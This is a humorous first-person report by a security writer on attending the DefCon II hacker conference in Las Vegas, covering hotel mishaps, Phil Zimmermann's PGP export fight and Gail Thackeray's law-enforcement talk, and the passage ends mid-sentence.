       And so was I.  Invited to speak. (Loose translation  for standing up in front of hundreds of 
       hackers  and being verbally skewered for having an opinion not in 100% accordance with their 
       own.)    
        
       "C'mon, it'll be fun," I was assured by DefCon's organizer, the Dark Tangent. 
        
       "Sure fired way to become mutilated monkey meat," I responded.  Some hackers just can't take a 
       joke, especially after a prison sentence and no opposite-sex sex. 
        
       "No really, they want to talk to you . . ." 
        
       "I bet." 
        
       It's not that I dislike hackers - on the contrary.  I have even let a few into my home to play with 
       my kids.  It's just that, so many of  antics that hackers have precipitated at other -Cons have 
       earned them a reputation of disdain by all, save those who remember their own non-technical 
       adolescent shenanigans.  And I guess I'm no different.  I've heard the tales of depraved 
       indifference, hotel hold-ups, government raids on folks with names similar to those who are 
       wanted for pushing the wrong key on the keyboard and getting caught for it.  I wanted to see 
       teens and X- generation type with their eyes so star sapphire glazed over that I could trade them 
       for chips at the craps table.    
        
       Does the truth live up to the fiction?  God, I hope so. It'd be downright awful and unAmerican if 
       500 crazed hackers didn't get into at least some serious trouble.   
        
       So I go to Vegas because, because, well, it's gonna be fun.  And, if I'm lucky, I might even see an 
       alien spaceship.   
        
       For you see, the party has already begun. 
        
       I go to about 30 conventions and conferences a year, but rarely if ever am I so Tylonol and 
       Aphrin dosed that I decide to go with a severe head cold.  Sympomatic relief notwithstanding I 
       debated and debated, and since my entire family was down with the same ailment I figured Vegas 
       was as good a place to be as at home in bed.  If I could survive the four and half hour plane flight 
       without my Eustahian tubes rocketing through my ear drums and causing  irreparable damage, I 
       had it made. 
        
       The flight was made tolerable becuase I scuba dive.  Every few minutes I drowned out the drone 
       of the engines by honking uncontrollably like Felix Ungerto without his aspirator.  To the chagrin 
       of my outspoken counter surveillance expert and traveling mate, Mike Peros and the rest of the 
       first class cabin,  the captain reluctantly allowed be to remain on the flight and not be expelled 
       sans parachute somewhere over Southfork, Texas.  Snort, snort.  Due to extensive flirting with 
       the two ladies across the aisle, we made the two thousand mile trek in something less than 34 
       minutes . . . or so it seemed.  Time flies took on new meaning.  
        
       For those who don't know, the Sahara Hotel is the dregs of the Strip.  We were not destined for 
       Caesar's or the MGM or any of the new multi-gazillion dollar hotel cum casinos which produce 
       pedestrian stopping extravaganzas as an inducement to suck in little old ladies to pour endless 
       rolls of Washington quarters in mechanical bottomless pits. The Sahara was built some 200 years 
       ago by native slave labor whose idea of plumbing is clean sand and decorators more concerned 
       with a mention in Mud Hut Daily than Architectural Digest.  It was just as depressingly dingy and 
       solicitly low class as it was when I forced to spend eleven days there (also with a killer case of the 
       flu) for an extended Comdex computer show.  But, hey, for a hacker show, it was top flight.   
        
       "What hackers?" The desk clerk said when I asked about the show. 
        
       I explained.  Computer hackers: the best from all over the country.  "I hear even Cyber Christ 
       himself might appear." 
        
       Her quizzical look emphasized her pause.  Better to ignore a question  not understood than to 
       look stupid.  "Oh, they'll be fine,  We have excellent security."  The security people, I found out 
       shortly thereafter knew even less: "What's a  hacker?"  Too much desert sun takes its toll.  Proof 
       positive photons are bad for neurons.   
        
       Since it was still only 9PM Mike and I sucked down a couple of $1 Heinekens in the casino and 
       fought it out with Lineman's Switching Union representatives who were also having their 
       convention at the Sahara.  Good taste in hotels goes a long way.   
        
       "$70,000 a year to turn a light from red to green?"  we complained. 
       "It's a tension filled job . . .and the overtime is murder." 
        
       "Why a union?" 
        
       "To protect our rights." 
        
       "What rights?" 
        
       "To make sure we don't get replaced by a computer . . ." 
        
       "Yeah," I agreed.  "That would be sad.  No more Amtrak disasters."  The crowd got ugly so we 
       made a hasty retreat under the scrutiny of casino security to our rooms. Saved. 
        
       Perhaps if I noticed or had read the original propaganda on DefCon, I might have known that 
       nothing significant was going to take place until the following (Friday) evening I might have 
       missed all the fun. 
        
       For at around 8AM, my congestion filled cavities and throbbing head was awakened by the sound 
       of an exploding toilet.  It's kind of hard to explain what this sounds like.  Imagine a toilet flushing 
       through a three megawatt sound system at a Rolling Stones concert. Add to that the sound of a 
       hundred thousand flue victims standing in an echo chamber cleansng their sinuses into a mountain 
       of Kleenex while three dozen football referees blow their foul whistles in unison, and you still 
       won't come close to the sheer cacophonous volume that my Saharan toilet exuded from within its 
       bowels.  And all for my benefit.   
        
       The hotel manager thought I was kidding.  "What do you mean exploded?" 
        
       "Which word do you not understand?" I growled in my early morning sub-sonic voice.  "If you 
       don't care, I don't."   
        
       My bed was floating.  Three or maybe 12 inches of water created the damnedest little tidal wave 
       I'd ever seen, and the sight and sound  of  Lake Meade in room 1487 only exascerbatd the 
       pressing need to relieve myself.  I dried my feet on the extra bed linens, worried about 
       electrocution and fell back asleep. It could have been 3 minutes or three hours later - I have no 
       way to know -  but my hypnogoic state was rudely interrupted by hotel maintenance pounding at 
       the door with three fully operational muffler- less jack hammers. 
        
       "I can't open it," I bellowed over the continual roar of my personal Vesuvius Waterfall.  "Just 
       c'mon in."  The fourteenth floor hallway had to resemble an underwater coral display becuase the 
       door opened ever so slowly.. 
        
       "Holy Christ!"   
        
       Choking back what would have been a painful laugh,  I somehow said with a smirk, "Now you 
       know what an exploding toilet is  like." 
        
       For, I swear, the next two hours three men whose English was worse than a dead Armadillo 
       attempted to suck up the Nile River from my room and the hallway.  Until that very moment in 
       time, I didn't know that hotels were outfitted with vacuum cleaners specifically designed to 
       vacuum water.  Perhaps this is a regular event. 
        
       Everyone who has ever suffered through one bitches about Vegas buffets, and even the hackers 
       steered away from the Sahara's  $1.95 "all you can eat" room: "The Sahara's buffet is the worst in 
       town; worse than Circus Circus."  But since I had left my taste buds at 37,000 feet along with 
       schrapneled pieces of my inner ear, I sought out sustenance only to keep me alive another 24 
       hours. 
        
       By mid afternoon, I had convinced myself that outside was not the place to be. After only 
       eighteen minutes of  120 sidewalk egg- cooking degrees, the hot desert winds took what was left 
       of my breath away and with no functioning airways as it was, I knew this was a big mistake.  So, 
       hacker convention, ready or not, here I come. 
        
       Now, you have to keep in mind that Las Vegas floor plans are designed with a singular purpose in 
       mind. No matter where you need to go, from Point A to Point B or Point C or D or anywhere, the 
       traffic control regulations mandated by the local police and banks require that you walk by a 
       minimum of 4,350 slot machines, 187 gaming tables of various persuasions and no less than 17 
       bars.  have they no remorse?  Madison Avenue ad execs tale heed!  
       . 
       So, lest I spend the next 40 years of my life in circular pursuit of a sign-less hacker convention 
       losing every last farthing I inheroted from dead Englishmen, I asked for the their well hidden 
       location at the hotel lobby. 
        
       "What hackers?"  There goes that nasty photon triggered neuron depletion again. 
        
       "The computer hackers." 
        
       "What computer hackers.  We don't have no stinking hackers . . ."  Desk clerk humor, my 
       oxymoron for the week. 
         
       I tried the name: DefCon II. 
        
       "Are we going to war?"  one ex-military Uzi-wielding guard said recognizing the etymology of 
       the term.  
        
       "Yesh, it's true"  I used my most convincing tone. "The Khasakstanis are coming with nuclear 
       tipped lances riding hundred foot tall horses.  Paris has already fallen.  Berlin is in ruins.  Aren't 
       you on the list to defend this graet land?" 
       "Sure as shit am!"   He scampered off to the nearest phone in an effort to be the first on the front 
       lines.  Neuron deficiency beyong surgical repair.. 
        
       I slithered down umpteen hallways and casino aisles lost in the jungleof jingling change.  Where 
       the hell are the hackers?   "They must be there," another neuron-impoverished Saharan employee 
       said as he pointed towards a set of escalators at the very far end of the casino.   
        
       All the way at the end of the almost 1/4 mile trek through Sodom and Gonorrhea an 'up' escalator 
       
       promised to take me to hackerdom.  Saved at last.  Upstairs.  A conference looking area. No signs 
       anywhere, save one of those little black Velcro-like stick-em signs where you can press on white 
       block letters. 
        
                               No Mo Feds 
        
       I must be getting close. Aha, a maintenance person; I'll ask him.  "What hackers?  What's 
       DefCon." 
        
       Back downstairs, through the casino, to the front desk, back through the casino, up the same 
       escalator again. Room One I was told.  Room One was empty.  Figures.  But, at the end of  a 
       hallway, past the men's room and the phones, and around behind Room One I saw what I was 
       looking for: a couple of dozen T-shirted, Seattle grunged out kids (read: under 30) sitting at 
       uncovered six foot folding tables hawking their DefCon II clothing, sucking on Heinekens and 
       amusing themselves with widely strewn backpacks and computers and cell phones. 
        
       I had arrived! 
        
       * * * * 
        
       You know, regular old suit and tie conferences could learn a thing or two from Jeff Moss, the 
       man behind DefCon II.  No fancy badge making equipment; no $75 per hour union labor built 
       registration desks; no big signs proclaiming the wealth of knowledge to be gained by signing up 
       early.  Just a couple of kids with a sheet of paper and a laptop.   
        
       It turned out I was expected.  They handed me my badge and what a badge it was.  I'm color 
       blind, but this badge put any psychedelically induced spectral display to shame.  In fact it was a 
       close  match to the Sahara's mid 60's tasteless casino carpeting which is so chosen as to hide the 
       most disgusting regurgative blessing.  But better and classier. 
        
       The neat thing was, you could (in fact had to) fill out your own badge once your name was 
       crossed off the piece of paper that represented the attendee list.   
        
       Name: 
       Subject of Interest: E-Mail: 
        
       Fill it out any way you want.  Real name, fake name, alias, handle - it really doesn't matter cause 
       the hacker underground ethic encourages anonymity.  "We'd rather not know who you are 
       anyway, unless you're a Fed.  Are you a Fed?" 
        
       A couple of lucky hackers wore the ultimate badge of honor.  An "I Spotted A Fed" T-shirt.  This 
       elite group sat or lay on the ground watching and scouring the registration area for signs that 
       someone, anyone, was a Fed.  They really didn't care or not if you were a Fed - they wanted the 
       free T-shirt and the peer respect that it brought. 
        
       I'm over 30 (OK, over 35) and more than a few times (OK, a little over 40) I had to vehemently 
       deny being a Fed.  Finally Jeff Moss came to the rescue. 
        
       "He's not a Fed.  He's a security guy and a writer." 
        
       "Ugh! That's worse.  Can I get a T-shirt cause he's a writer?"  No way hacker-breath. 
        
       Jeff.  Jeff Moss. Not what I expected.  I went to school with a thousand Jeff Mosses.  While I had 
       hair down to my waist, wearing paisley leather fringe jackets and striped bell bottoms so wide I 
       appeared to be standing on two inverted ice cream cones, the Jeff Mosses of the world kept their 
       parents proud.  Short, shsort cropped hair, acceented by an ashen pall and clothes I stlll wouldn't 
       wear today.  They could get away with anything cause they didn't look the part of radical chic.  
       Jeff, I really like Jeff: he doesn't look like what he represents.  Bruce Edelstein, (now of HP fame) 
       used to work for me.  He was hipper than hip but looked squarer than square.  Now today that 
       doesn't mean as much as it used to, but we ex-30-somethings have a hard time forgetting what 
       rebellion was about. (I was suspended 17 times in the first semester of 10th grade for wearing 
       jeans.) 
        
       Jeff would fit into a Corporate Board Meeting if he wore the right suit and uttered the right 
       eloquencies:  Yes, that's it: A young Tom Hanks.  Right.  I used to hate Tom Hanks (Splach, how 
       fucking stupid except for the TV-picture tube splitting squeals) but I've come to respect the hell 
       out of him as an actor.  Jeff never had to pass through that first phase.  I instantly liked him and 
       certainly respect his ability to pull off a full fledged conference for only $5000.   
        
       You read right. Five grand and off to Vegas with 300 of your closest personal friends, Feds in 
       tow, for a weekend of electronic debauchery.   "A few hundred for the brochure, a few hundred 
       hear, a ton in phone bills, yeah, about $5000 if no one does any damage."  Big time security 
       shows cost $200,000 and up.  I can honestly say without meaning anything pejorative at any of 
       my friends and busienss acquaintances, that I do not learn 40 times as much at the 'real' shows.  
       Something is definitely out  of whack here.  Suits want to see suits.  Suits want to see fancy.  
       Suits want to see form, substance be damned.  Suits should take a lesson from my friend Jeff. 
        
       * * * * * 
        
       I again suffered through a tasteless Saharan buffer dinner which cost me a whopping $7.95.   I 
       hate grits -buttered sand is what I call them - but in this case might well have been preferable.  
       Somehow I coerced a few hackers to join me in the ritualistic slaughter of our taste buds and 
       torture of our intestines.  They were not pleased with my choice of dining, but then who gives a 
       shit?  I couldn't anything anyway.  Tough.  
        
        To keep out minds off of the food we talked about something much more pleasant: the recent 
       round of attacks on Pentagon computers and networks.  "Are the same people involved as in the 
       sniffing attacks earlier this year?" I asked my triad of dinner mates.  
        
       "Indubitably." 
        
       "And what's the reaction from the underground - other hackers?" 
        
       Coughs, sniffs.  Derivie visual feedback. Sneers. The finger. 
        
       "We can't stand 'em.  They're making it bad for everybody."  Two fingers. 
        
       By and large the DefCon II hackers are what I call 'good hackers' who hack, and maybe crack 
       some systems upon occasion, but aren't what I refer to as Information Warriors in the bad sense 
       of the word.  This group claimed to extol the same position as most of the underground would:  
       the Pentagon sniffing crackers - or whoever who is assaulting thousands of computers on the net - 
       must be stopped.  
        
       "Scum bags, that what they are."  I asked that they not sugarcoat their feelings on my behalf.  I 
       can take it.  "These fuckers are beyond belief; they're mean and don't give a shit how much 
       damage they do."  We played with our food only to indulge inthe single most palatable edible on 
       display: ice cream with gobs of chocolate syrup with a side of coffee. .  
        
       The big question was, what to do?  The authorities are certainly looking for a legal response; 
       perhaps another Mitnick or Phiber Optik.  Much of the underground cheered when Mark Abene 
       and others from the reknowned Masters of Destruction went to spend a vacation at the expense of 
       the Feds.  The MoD was up to no good and despite Abene's cries that there was no such thing as 
       the MoD, he lost and was put away.  However many hackers believe as I do, that sending Phiber 
       to jail for hacking was the wrong punishment. Jail time won't solve anything nor cure a hacker 
       from his first love.  One might as well try to cure a hungry man from eating:  No, Mark did 
       wrong, but sending him to jail was wrong, too.  The Feds and local computer cops and the courts 
       have to  come up with punishments appropriate to the crime. Cyber-crimes (or cyber-errors) 
       should not be rewarded by a trip to an all male hotel where the favorite toy is a phallically carved 
       bar of soap. 
        
       On the other hand, hackers in general are so incensed over the recent swell of headline grabbing 
       break-ins, and law enforcement has thus far appeared to be impotent, ("These guys are good.") 
       that many are searching for alternative means of retribution. 
        
       "An IRA style knee capping is in order," said one. 
        
       "That's not good enough, not enough pain," chimed in another.  (Sip, sip. I can almost taste the 
       coffee.) 
        
       "Are you guys serious?" I asked.  Violence?  You? I thought I knew them better than that. I know 
       a lot of hackers, none that I know of is violent, and this extreme Pensacola retributition attitude 
       seemed tottally out of character.  "You really wouldn't do that, would you?"  My dinner 
       companions were so upset and they claimed to echo the sentiment of all good-hackers in good 
       standing, that yes, this was a viable consideration. 
        
       "The Feds aren't doing it, so what choice do we have?  I've heard talk about taking up a collection 
       to pay for a hit man . . ."  Laughter around, but nervous laughter.  
        
       "You wouldn't. . ." I insisted. 
        
       "Well, probably not us, but that doesn't mean someone else doesn't won't do it."  
        
       "So you know who's behind this whole thing." 
        
       "Fucking-A we do," said yet another hacker chomping at the bit. He was obviously envisioning 
       himself  with a baseball bat in his hand. 
        
       "So do the Feds." 
        
       So now I find myself in the dilemma of publishing the open secret of who's behind the Internet 
       sniffing and Pentagon break ins, but after talking to people from both the underground and law 
       enforcement, I think I'll hold off awhile  It serves no immediate purpose other than to warn off the 
       offenders, and none of us want that. 
        
       Obviously all is not well in hacker-dom. 
        
       * * * * * 
        
       The registration area was beyond full; computers, backpacks everywhere, hundreds of what I have 
       to refer to as kids and a fair number of above ground security people.  Padgett Peterson of Martin 
       Marietta was going to talk about viruses, Sara Gorden on privacy, Mark Aldrich is a security guy 
       from DC., and a bunch of  other folks I see on the seemingly endless security trade show circuit. 
       Jeff Moss had marketed himself and the show excellently.  Los Angeles send a TV crew, John 
       Markoff from the New York Times popped in as did a writer from Business Week.  (And of 
       course, yours truly.)  
        
       Of the 360 registrees ("Plus whoever snuck in," added Jeff) I guess about 20% were so-called 
       legitimate security people. That's not to belittle the mid-20's folks who came not because they 
       were hackers, but because they like computers.  Period.  They hack for themselves and not on 
       other systems, but DefCon II offered something for everyone.   
        
       I remember 25 years ago how my parents hated the way I dressed for school or concerts or just to 
       hang out: God forbid! We wore those damned jeans and T-shirts and sneakers or boots! "Why 
       can't you dress like a human being," my mother admonished me day after day, year after year.  So 
       I had to check myself because I can't relate to Seattle grunge-ware. I'm just too damned old to 
       wear shirts that fit like kilts or sequin crusted S&M leather straps.  Other than the visual 
       cacophony of dress, every single hacker/phreak that I met exceeded my expectations in the area of 
       deportment. 
        
       These are not wild kids on a rampage.  The stories of drug-induced frenzies and peeing in the 
       hallways and tossing entire rooms of furniture out of the window that emanated from the 
       HoHoCons seemed a million miles away.  This was admittedly an opportunity to party, but not to 
       excess.  There was work to be done, lessons to be learned and new friends to make.  So getting 
       snot nosed drunk or ripped to the tits or Ecstatically high was just not part of the equation.  Not 
       here. 
        
       Now  Vegas offers something quite distinct from other cities which host security or other 
       conventions.  At a Hyatt or a Hilton or any other fancy-ass over priced hotel, beers run $4 or $5 a 
       crack plus you're expected to tip the black tied minimum wage worker for popping the top.  The 
       Sahara (for all of the other indignities we had to suffer) sosmewhat redeemed itself by offering an 
       infinite supply of $1 Heinekens. Despite hundreds of beer bottle spread around the huge 
       conference area (the hotel was definitely stingy in the garbage pail business) public drunkenness 
       was totally absent.  Party yes.  Out of control? No way.  Kudos! 
        
       Surprisingly, a fair number of women (girls) attended.  A handful were there 'for the ride' but 
       others . . . whoa! they know their shit.  
        
       I hope that's not sexist; merely an observation.  I run around so few technically fluent ladies it's 
       just a gut reaction.  I wish there were more.  In a former life, I owned a TV/Record production 
       company called Nashville North. We specialized in country rock taking advantage of the Urban 
       Cowboy fad in the late 1970's. Our crew of producers and engineers consisted of the  "Nashville 
       Angels."  And boy what a ruckus they would cause when we recorded Charlie Daniels or Hank 
       Williams: they were stunning.  Susan produced and was a double fo Jacqueline Smith; we called 
       Sally "Sabrina" because of her boyish appearance and resemblance to Kate Jackson.  A super 
       engineer.  And there was Rubia Bomba, the Blond Bombshell, Sherra, who I eventually married: 
       she knew country music inside and out - after all she came from Nashville in the first place.   
        
       When we would be scheduled to record an act for live radio, some huge famous country act like 
       Asleep at The Wheel of Merle Haggard or Johnny Paycheck or Vassar Clements, she would 
       wince in disbelief when we cried, "who's that?"  Needless to say, she knew the songs, the cues and 
       the words.  They all sounded alike.  Country Music?  Ecch.  (So I learned.) 
        
       At any rate, ladies, we're equal opportunity offenders.  C'mon down and let's get technical. 
        
       As the throngs pressed to register, I saw an old friend, Erik Bloodaxe.  I've known him for several 
       years now and he's even come over to baby sit the kids when he's in town.  (Good practice.)   Erik 
       is about as famous as they come in the world of hackers.  Above ground the authorities 
       investigated him for his alleged participation in cyber crimes: after all, he was one of the founders 
       of the Legion of Doom, and so, by default, he must have done something wrong.  Never 
       prosecuted, Erik Bloodaxe lives in infamy amongst his peers.  To belay any naysayers, Erik 
       appeared on every single T-shirt there. 
        
       "I Only Hack For Money," 
               Erik Bloodaxe 
        
       proclaimed dozens of shirts wandering through the surveillance laden casinos. His is a name that 
       will live in infamy.   
        
       So I yelled out, "Hey Chris!"  He gave his net-name to the desk/table registrar. "Erik Bloodaxe." 
        
       "Erik Bloodaxe?" piped up an excited high pitched mail voice.  "Where?"  People pointed at Chris 
       who was about to be embarrassingly amused by sweet little tubby Novocain who practically 
       bowed at Chris's feet in reverence.  "You're Erik Bloodaxe?"  Novocain said with nervous awe - 
       eyes gleaming up at Chris's ruddy skin and blond pony-tail.   
        
       "Yeah," Chris said in the most off handed way possible.  For people who don't know him this 
       might be interpreted as arrogance (and yes there is that) but he also has trouble publicly accepting 
       the fame and respect that his endearing next-generation teenage fans pour on him. 
        
       "Wow!" Novocain said with elegance and panache.  "You're Erik Bloodaxe."  We'd just been 
       through that said Chris's eyes. 
       "Yeah." 
        
       "Wow, well, um, I  . . . ah . . . you're . . . I mean, wow, you're the best."  What does Sylvia Jane 
       Miller from Rumpsteer, Iowa say to a movie star?  This about covered it.  The Midwest meets 
       Madonna.  "Wow!"  Only here it's Novocain meets Cyber Christ himself. 
        
        
        
       Like any other security show or conference or convention there is a kickoff, generally with a 
       speech.  And DefCon II was no exception.  Except. 
        
       Most conventional conventions (ConCons) start at 7:30 or 8:00 AM because, well I don't know 
       exactly why, except that' when so- called suits are expected to show up in their cubicles.    
       DefCon, on the other hand, was scheduled to start at 10PM on Friday night when most hakcers 
       show up for work. Most everyone had arrived and we were anxiously awaiting the opening 
       ceremonies.  But, here is where Jeff's lack of experience came in.  The kick- off speaker was 
       supposed to be Mark Ludwig of  virus writing fame and controversy.  But, he wasn't there! 
        
       He had jet lag. 
        
       "From Phoenix?" I exclaimed in mock horror to which nearby hackers saw the absurdity of a 45 
       minute flight jet lag.  Mark has a small frame and looks, well, downright weak, so I figured maybe 
       flying and his constitution just didn't get along and he was massaging his swollen adenoids in his 
       room.   
        
       "Oh, no! He's just come in from Australia . . ."  Well that explains it, alright!  Sorry for the 
       aspersions, Mark. 
        
       But Jeff didn't have a back up plan. He was screwed.  Almost four hundred people in the audience 
       and nothing to tell them.  So, and I can't quite believe it, one human being who had obviously 
       never stood in front of a live audience before got up in an impromptu attempt at stand up comedy.  
       The audience was ready for almost anything entertaining but this guy wasn't. Admittedly it was a 
       tough spot, but . . . 
        
       "How do you turn a 496 into an 8088?"   
        
       "Add Windows."  Groan. Groan. 
        
       "What's this?"  Picture the middle three fingers of your right hand wiggling madly. 
        
       "An encrypted this!"  Now hold out just the middle finger.  Groan.  Groan. 
        
       "What's this?"  Spread your legs slightly apart, extend both hands to the front and move them 
       around quickly in small   circles  
        
       "Group Air Mouse."  Groan.  
        
       The evening groaned on with no Mark nor any able sharp witted comedian in sight.  
        
        
        
       Phil Zimmerman wrote PGP and is a God, if not Cyber-Christ himself to much of the global 
       electronic world.  Preferring to call himself a folk hero (even the Wall Street Journal used that 
       term) Phil's diminutive height combined with a few too many pounds and a sweet as sweet can be 
       smile earn him the title of Pillsbury Dough Boy look alike.  Phil is simply too nice a guy to be 
       embroiled in a Federal investigation to determine if he broke the law by having PGP put on a net 
       site.  You see, the Feds still think they can control Cyberspace, and thereby maintain antique 
       export laws: "Thou shalt not export crypto without our approval" sayeth the NSA using the 
       Department of Commerce as a whipping boy mouth piece.  So now Phil faces 41-51 months of 
       mandatory jail time if prosecuted and convicted of these absurd laws.   
        
       Flying in from Colorado, his appearance was anxiously awaited. "He's really coming?"  " I wonder 
       what he's like?"  (Like eevryone else, fool, just different.)  When he did arrive, his shit- eating grin 
       which really isn't a shit-eating grin, it's just Phil's own patented grin, preceeded him down the 
       hallway.   
        
       "Here he is!"  "It's Phil Zimmerman."  Get down and bow.  "Hey, Phil the PGP dude is here." 
        
       He was instantly surrounded by those who recognize him and by both those who don't but want to 
       feel like part of the in-crowd.  Chat chat, shit-eating grin, good war stories and G-rated 
       pleasantries.  Phil was doing what he does best: building up the folk hero image of himself.  His 
       engaging personality (even though he can't snorkel to save his ass) mesmerized the young-uns of 
       the group.  "You're Phil?"   
        
       "Yeah."  No arrogance, just a warm country shit-eating grin that's not really shit-eating.  Just Phil 
       being Phil.  He plays the part perfectly. 
        
       Despite the attention, the fame, the glory (money? nah . . .) the notoriety and the displeased eyes 
       of onlooking Computer Cops who really do believe he belongs in jail for 4 years, Phil had a 
       problem tonight.  A real problem. 
        
       "I don't have a room!" he quietly told Jeff at the desk.  "They say I'm not registered."  Np panic.  
       Just a shit-eating grin that's not a shit-eating grin and hand the problem over the experts: in this 
       case Jeff Moss.  Back to his endearing fans.  Phil is so damned kind I actually saw him giving 
       Cryptography 101 lessons on the corner of a T-shirt encrusted table.  "This is  plaintext and this is 
       crypto.  A key is like a key to your hotel room . . . " If Phil had a hotel room. 
        
       Someone had screwed up. Damn computers.  So the search was on.  What had happened to Phil's 
       room?  Jeff is scrambling and trying to get the hotel to rectify the situation  Everyone was abuzz.  
       Phil, the crypto-God himself was left out in the cold.  What would he do? 
        
       When suddenly, out of the din in the halls, we heard one voice above all the rest: 
        
       "Phil can sleep with me!"   
        
       Silence.  Dead stone cold silence.  Haunting silence like right after an earthquake and even the 
       grubs and millipedes are so shaken they have nothing to say.  Silence.  
        
       The poor kid who had somehow instructed his brain to utter the words and permitted them to rise 
       through his esophagus and out over his lips stood the object of awe, incredulity and mental 
       question marks.  He must have thought to himself, "what's everyone staring at?  What's going on?  
       Let me in on it."  For the longest 10 seconds in the history of civilization he had absolutely no clue 
       that he was the target of attention.  A handful of people even took two or three steps back, just in 
       case.  Just in case of what was never openly discussed, but nonetheless, just in case. 
        
       And then the brain kicked in and a weak sheepish smile of guilt overcame this cute acne-free 
       baby-butt smooth-faced hacker who had certainly never had a shave, and was barely old enough 
       to steer his own pram.  
        
       "Ohhhhhh . . . . noooooo," he said barely louder than a whisper.  "That' not what I mean!" 
        
       I nearly peed laughing so hard in unison with a score of hackers who agreed that these misspoken 
       words put this guy in the unenviable position of being the recipient of a weekend of eternal 
       politically incorrect ridicule.   
        
       "Yeah, right.  We know what you mean . . " 
        
       "No really . . ." he pleaded as the verbal assaults on his alleged sexual preferences were slung one 
       after the other.   
        
       This poor kid never read Shakespeare: "He who doth protest too much . . ."   
        
       If we couldn't have a great kickoff speech, or comedian, this would have to do.   
        
       The majority of the evening was spent making acquaintances: 
       "Hi, I'm Jim.  Oops, I mean 'Septic Tank," was greeted with "Oh, you're Septic. I'm Sour Milk."  
       (Vive la difference!) People who know each other electronically are as surprised to meet their 
       counterparts as are first daters who are in love with the voice at the other end of the phone.  
       "Giving good phone" implies one thing while "Having a great keystroke" just might mean another.   
        
       The din of the crowd was generally penetrated by the sounds of a quasi-pornographic Japanese 
       high tech toon of questionable socially redeeming value which a majority of the crowd appeared 
       to both enjoy and understand.  I am guilty of neither by reason of antiquity. 
        
       And so it goes. 
        
       * * * * *  
        
       Phil Zimmerman must have gotten a room and some sleep because at 10AM (or closely 
       thereafter) he gave a rousing (some might say incendiary) speech strongly attacking the 
       government's nearly indefensible position on export control   
        
       I was really impressed.  Knowing Phil for some time, this was the first time I ever heard him speak 
       and he did quite an admirable job.  He ad libs, talks about what he want to talk about and does so 
       in a compelling and emotional way. His ass is on the line and he should be emotional about it.  
       The audience, indeed much of counter culture Cyberspace loves Phil and just about anything he 
       has to say.  His affable 40-something attorney from Colorado, Phil DuBois was there to both 
       enjoy the festivities and, I'm sure, to keep tabs on Phil's vocalizations.  Phil is almost too honest 
       and open for his own good.  Rounds and rounds of sincere appreciation. 
        
        
       Hey kids, now it's time for another round of Spot The Fed.  Here's your chance to win one of 
       these wonderful "I Spotted A Fed" T-shirts. and all you have to do is ID a fed and it's yours.  
       Look around you?  Is he a Fed?  Is she under cover or under the covers? Heh, heh.  Spot the Fed 
       and win a prize.  This one-size- fits-all XXX Large T-shirt is yours if you Spot the Fed.  I had to 
       keep silent.  That would have been cheating.  I hang out on both sides and have a reputation to 
       maintain. 
        
       "Hey, I see one" screeched a female voice (or parhaps it was Phil's young admirer) from the left 
       side of the 400+ seat ballroom.  Chaos!  Where? Where?  Where's the fed?  Like when Jose 
       Consenko hits one towards the center field fence and 70,000 screaming fans stand on their seats 
       to get a better view of a ball 1/4 mile away flying at 150 miles per hour, this crowd stood like 
       Lemmings in view of Valhalla the Cliff to espy the Fed.  Where's the Fed? 
        
       Jeff jumped off the stage in anxious anticipation that yet another anti-freedom-repressive law 
       enforcement person had blown  his cover.  Where's the Fed?  Jeff is searching for the accuser and 
       the accused.  Where's the Fed?  Craned necks as far as the eye can see; no better than rubber 
       neckers on Highway 95 looking for steams of blood and misplaced body parts they half expected 
       a Fed to be as distinctly obvious as Quasimoto skulking under the Gorgoyled parapits of Notre 
       Dame.  No such like.  They look like you and me. (Not me.)  Where's the Fed? 
        
       He's getting closer, closer to the Fed.  Is it a Fed?  Are you a Fed?  C'mon, fess up.  You're a a 
       fed. Nailed.  Busted.  Psyche! 
        
       Here's your T-shirt.  More fun than Monty Hall bringing out aliens from behind Door #3 on the 
       X-Files.  Good clean fun. But they didn't get 'em all.  A couple of them were real good.  Must 
       have been dressed like an Hawaiian surf bum or banshee from Hellfire, Oregon.  Kudos to those 
       Feds I know never got spotted.  Next year, guys.  There's always next year. 
        
       Phil's notoriety and the presence of the Phoenix,Arizona prosecutor  who was largely responsible 
       for the dubiously effective or righteous Operation Sun Devil, Gail Thackeray ("I change job every 
       4 years or so - right after an election")  brought out the media.  The LA TV station thought they 
       might have the makings of a story and sent a film crew for the event.   
        
       "They're Feds. The ones with the cameras are Feds.  I know it. Go ask 'em."  No need. Not.  
        
       "Put away that camera."  At hacking events it's proper etiquette to ask if people are camera shy 
       before shooting.   The guy that I was sitting next to buried his face in his hands to avoid being 
       captured on video tape.  
        
       "What are you; a Fed or a felon?" I had to ask. 
        
       "What's the difference," his said.  "They're the same thing."  So which was it, I wondered.  For the 
       truly paranoid by the truly paranoid.    
        
       "Get that thing outta here," he motioned to the film crew who willingly obliged by turning off the 
       lights.  "They're really Feds," he whispered to me loud enough for the row in front and behind us 
       to hear.   
        
       I moved on.  Can't take chances with personal safety when I have kids to feed.  Fed or felon, he 
       scared me. 
        
       Gail Thackeray: was the next act on stage. She was less in agreement about Phil Zimmerman than 
       probably anyone (except the undetected Feds) in the audience.  She, as expected, endorsed much 
       of the law enforcement programs that revolve around various key management (escrow) schemes.  
       Phil recalls a letter from Burma that describe how the freedom fighters use PGP to defend 
       themselves against repression.  He cites the letter from Latvia that says electronic freedom as 
       offered by PGP is one of the only  hopes for the future of a free Russia.  Gail empathizes but sees 
       trouble closer to home. Terrorism a la World Trade Center, or rocket launchers at O'Hare 
       Airport, or little girl snuff films in Richmond, Virginia, or the attempt to poison the water supply 
       outside of Boston.  These are the real threats to America in the post Cold War era. 
        
       "What about our personal privacy!" cries a voice.  "We don't want the government listening in.  
       It's Big Brother 10 years behind schedule."  
        
       Gail is amused.  She knew it would be a tough audience and has been through it before.  She is 
       not shaken in the least.   
        
       "I've read your mail," she responds.  "Its not all that interesting."  The audience appreciates a 
       good repartee. "You gotta pay me to do this, and frankly most of it is pretty boring."  She 
       successful made her point and kept the audience laughing all the way. 
        
       She then proceeded to tell that as she sees it, "The expectation of privacy isn't real."  I really don't 
       like hearing this for I believe in the need for an Electronic Bill of Rights.  I simply think she's 
       wrong.  "History is clear," she said  "the ability to listen in used to be limited to the very few.  The 
       telegraph was essentially a party line and still today in some rural areas communications have 
       never been private.  Why should we change it now?" 
        
       "Gail, you're so full of shit!" A loud voice bellowed from next me again.  Boy can I pick seats.  
       "You know perfectly well that cops abuse the laws and this will just make their jobs easier. Once 
       people find a way to escape tyranny you all want to bring it right back again.  This is revolution 
